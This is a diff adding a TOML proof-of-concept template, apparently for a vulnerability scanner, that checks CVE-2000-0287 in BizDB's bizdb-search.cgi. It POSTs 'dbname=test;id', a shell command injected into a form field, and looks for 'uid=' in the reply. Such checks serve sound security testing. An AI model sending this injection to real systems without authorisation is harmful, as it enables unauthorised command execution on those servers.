@@ -1,0 +1,41 @@
+[info]
+author = "ave"
+description = "CNC Technology BizDB 1.0 bizdb-search.cgi 远程命令执行漏洞验证。通过 dbname 参数注入 shell 元字符（分号、管道符、反引号）实现远程命令执行。"
+id = "POC-AVE-2000-0255"
+name = "CVE-2000-0287 PoC"
+severity = "critical"
+tags = ["ave-2000-0255"]
+vuln_id = [
+    "CVE-2000-0287",
+    "AVE-2000-0255",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/cgi-bin/bizdb-search.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "dbname=test;id"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid=",
+    "gid=",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
